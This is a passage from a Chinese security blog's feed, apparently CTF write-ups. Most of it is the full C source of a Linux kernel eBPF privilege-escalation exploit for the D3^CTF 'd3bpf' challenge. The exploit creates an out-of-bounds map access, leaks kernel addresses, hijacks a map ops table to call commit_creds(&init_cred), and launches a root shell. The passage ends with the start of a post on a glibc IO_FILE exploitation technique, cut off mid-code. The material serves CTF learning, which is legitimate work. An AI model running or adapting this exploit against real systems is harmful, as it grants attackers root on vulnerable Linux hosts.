bpf(BPF_OBJ_GET_INFO_BY_FD, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">map_get_next_key</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run_bpf_prog</span><span class="params">(struct bpf_insn *insn, <span class="keyword">uint32_t</span> cnt, <span class="keyword">int</span> *prog_fd_out)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> prog_fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> verifier_log_buff[<span class="number">0x200000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> socks[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">prog_attrs</span> =</span></span><br><span class="line">        &#123;</span><br><span class="line">            .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">            .insn_cnt = cnt,</span><br><span class="line">            .insns = (<span class="keyword">uint64_t</span>)insn,</span><br><span class="line">            .license = (<span class="keyword">uint64_t</span>) <span class="string">&quot;&quot;</span>,</span><br><span class="line">            .log_level = <span class="number">2</span>,</span><br><span class="line">            .log_size = <span class="keyword">sizeof</span>(verifier_log_buff),</span><br><span class="line">            .log_buf = (<span class="keyword">uint64_t</span>)verifier_log_buff&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">    &#123;</span><br><span class="line">        prog_fd = *prog_fd_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= prog_fd)</span><br><span class="line">    &#123;</span><br><span class="line">        prog_fd = bpf(BPF_PROG_LOAD, &amp;prog_attrs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt; prog_fd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(verifier_log_buff);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, socks))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x7</span> != write(socks[<span class="number">1</span>], <span class="string">&quot;zzzzzzz&quot;</span>, <span class="number">7</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">    &#123;</span><br><span class="line">        *prog_fd_out = prog_fd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        close(prog_fd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">    close(socks[<span class="number">0</span>]);</span><br><span class="line">    close(socks[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXP_REG BPF_REG_8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OOB_REG BPF_REG_7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STORE_REG BPF_REG_6</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> attack(oob_map_fd, store_map_fd)                                     \</span></span><br><span class="line"><span class="meta">    BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd),                                    \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),                       \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(OOB_REG, BPF_REG_0),                                   \</span></span><br><span class="line"><span class="meta">        BPF_LD_MAP_FD(BPF_REG_1, store_map_fd),                              \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),                       \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(STORE_REG, BPF_REG_0),                                 \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_9, 64),                                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(EXP_REG, 1),                                           \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_RSH, EXP_REG, BPF_REG_9),                          \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_0, EXP_REG),                                   \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, OOB_REG, 0x1000),                             \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_0, 0x1000 - 1),                       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, OOB_REG, BPF_REG_0),                          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> setup_btf_bpf_prog_fd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_kernel</span><span class="params">(<span class="keyword">int</span> oob_map_fd, <span class="keyword">int</span> store_map_fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">char</span> *buf, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> values[<span class="number">0x1500</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">read_map_ops_content</span>[] =</span> &#123;</span><br><span class="line">        attack(oob_map_fd, store_map_fd),</span><br><span class="line">        BPF_ALU64_IMM(BPF_MUL, EXP_REG, <span class="number">0xD0</span>),</span><br><span class="line">        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, <span class="number">8</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len / <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(values, <span class="number">0</span>, <span class="keyword">sizeof</span>(values));</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info_kernel</span> <span class="title">info</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">            .info.bpf_fd = oob_map_fd,</span><br><span class="line">            .info.info = (<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;info,</span><br><span class="line">            .info.info_len = <span class="keyword">sizeof</span>(info)&#125;;</span><br><span class="line"></span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;values[<span class="number">8</span>])[<span class="number">0</span>] = addr - <span class="number">0x58</span>;</span><br><span class="line">        <span class="keyword">if</span> (addr == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ((<span class="keyword">uint64_t</span> *)&amp;values[<span class="number">8</span>])[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(store_map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">        &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(read_map_ops_content, <span class="keyword">sizeof</span>(read_map_ops_content) / <span class="keyword">sizeof</span>(read_map_ops_content[<span class="number">0</span>]), &amp;setup_btf_bpf_prog_fd))</span><br><span class="line">        &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != obj_get_info_by_fd(&amp;attr))</span><br><span class="line">        &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to get map info\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        addr = addr + <span class="number">4</span>;</span><br><span class="line">        ((<span class="keyword">uint32_t</span> *)buf)[i] = info.btf_id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> raw_array_map_ops = <span class="number">0xffffffff820363a0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// save_status();</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">map_attr</span> =</span> &#123;</span><br><span class="line">        .map_type = BPF_MAP_TYPE_ARRAY,</span><br><span class="line">        .key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">        .value_size = <span class="number">0x1500</span>,</span><br><span class="line">        .max_entries = <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> store_map_fd = create_map(&amp;map_attr);</span><br><span class="line">    <span class="keyword">int</span> oob_map_fd = create_map(&amp;map_attr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (store_map_fd &lt; <span class="number">0</span> || oob_map_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;Failed to create map\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *values = <span class="built_in">malloc</span>(<span class="number">0x3000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ops[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memset</span>(values, <span class="number">0</span>, <span class="keyword">sizeof</span>(values));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(oob_map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(store_map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">read_map_ops</span>[] =</span> &#123;</span><br><span class="line">        attack(oob_map_fd, store_map_fd),</span><br><span class="line">        BPF_ALU64_IMM(BPF_MUL, EXP_REG, <span class="number">0x110</span>),</span><br><span class="line">        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, OOB_REG, <span class="number">0</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, STORE_REG, BPF_REG_0, <span class="number">8</span>),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(read_map_ops, <span class="keyword">sizeof</span>(read_map_ops) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != lookup_map_element(store_map_fd, <span class="number">0</span>, values))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to lookup map element\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> array_map_ops = ((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(&amp;values[<span class="number">8</span>]))[<span class="number">0</span>];</span><br><span class="line">    kernel_offset = array_map_ops - raw_array_map_ops;</span><br><span class="line">    kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> modprobe_path_addr = <span class="number">0x1a6c240</span> + kernel_base;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> work_for_cpu_fn_addr = kernel_offset + <span class="number">0xffffffff810bc190</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds_addr = kernel_offset + <span class="number">0xffffffff810cce30</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> init_creds_addr = kernel_offset + <span class="number">0xffffffff82a6b880</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;array_map_ops_addr =&gt; %p\n&quot;</span>, array_map_ops);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base =&gt; %p\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_offset =&gt; %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;modprobe_path =&gt; %p\n&quot;</span>, modprobe_path_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;work_for_cpu_fn =&gt; %p\n&quot;</span>, work_for_cpu_fn_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;commit_creds_addr =&gt; %p\n&quot;</span>, commit_creds_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;init_creds_addr =&gt; %p\n&quot;</span>, init_creds_addr);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">read_map_addr</span>[] =</span> &#123;</span><br><span class="line">        attack(oob_map_fd, store_map_fd),</span><br><span class="line">        BPF_ALU64_IMM(BPF_MUL, EXP_REG, <span class="number">0x110</span> - <span class="number">0xc0</span>),</span><br><span class="line">        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, OOB_REG, <span class="number">0</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, STORE_REG, BPF_REG_0, <span class="number">8</span>),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(read_map_addr, <span class="keyword">sizeof</span>(read_map_addr) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != lookup_map_element(store_map_fd, <span class="number">0</span>, values))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to lookup map element\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> map_ptr = ((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(&amp;values[<span class="number">8</span>]))[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;map_ptr =&gt; %p\n&quot;</span>, map_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gap =&gt; %p\n&quot;</span>, (modprobe_path_addr - map_ptr));</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> map_value = map_ptr - <span class="number">0xc0</span> + <span class="number">0x110</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0x79706f432f00</span></span><br><span class="line"></span><br><span class="line">    read_kernel(oob_map_fd, store_map_fd, array_map_ops, values, <span class="number">0xf0</span>);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(values + <span class="number">8</span> * <span class="number">4</span>)) = work_for_cpu_fn_addr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(oob_map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;get_ops!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">modify_oob_map</span>[] =</span> &#123;</span><br><span class="line">        attack(oob_map_fd, store_map_fd),</span><br><span class="line">        BPF_ALU64_IMM(BPF_MUL, EXP_REG, <span class="number">0x110</span>),</span><br><span class="line">        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, <span class="number">0x20</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, <span class="number">0x20</span>),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, <span class="number">0x28</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, <span class="number">0x28</span>),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, <span class="number">0x30</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    ops[<span class="number">4</span>] = commit_creds_addr;</span><br><span class="line">    ops[<span class="number">5</span>] = init_creds_addr;</span><br><span class="line">    ops[<span class="number">6</span>] = map_value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(store_map_fd, <span class="number">0</span>, ops, BPF_ANY))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(modify_oob_map, <span class="keyword">sizeof</span>(modify_oob_map) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] updated oob_map&quot;</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> key = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> next_key;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = oob_map_fd,</span><br><span class="line">        .key = &amp;key,</span><br><span class="line">        .next_key = &amp;next_key&#125;;</span><br><span class="line">    map_get_next_key(&amp;attr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] commit_cred(&amp;init_cred) done!\n&quot;</span>);</span><br><span class="line">    get_shell();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230106194449337.png"                      alt="image-20230106194449337"                ></p><hr><p>题目放在: <a class="link"   href="https://github.com/196082/196082/blob/main/kernel_pwn/d3bpf.zip" >https://github.com/196082/196082/blob/main/kernel_pwn/d3bpf.zip<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;虽然在之前出过几篇关于bpf的文章，但是我并没有得到很深层次的理解，文章的exp基本就是copy的。并且，D3^CTF 2022还有两道ebpf需要复现，所以现在就选择了复现一下。&lt;/p&gt;
&lt;h2 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; class=&quot;heade</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="ebpf" scheme="https://cv196082.gitee.io/tags/ebpf/"/>
    
  </entry>
  
  <entry>
    <title>house of lalala</title>
    <link href="https://cv196082.gitee.io/2022/12/01/house-of-lalala/"/>
    <id>https://cv196082.gitee.io/2022/12/01/house-of-lalala/</id>
    <published>2022-12-01T05:45:58.000Z</published>
    <updated>2022-12-01T05:45:28.861Z</updated>
    
    <content type="html"><![CDATA[<p>近期又出现一个新的关于<code>IO_FILE</code>的利用方式，不过原作者并没有出名字但是我blog又是用house of系列分类的所以就先随便取个名字。</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>此次聚焦的vtable表为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* the jump table.  */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_obstack_jumps</span> <span class="title">libio_vtable</span> <span class="title">attribute_hidden</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, _IO_obstack_overflow),</span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_obstack_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>主要利用的结构体为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_obstack_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">file</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span 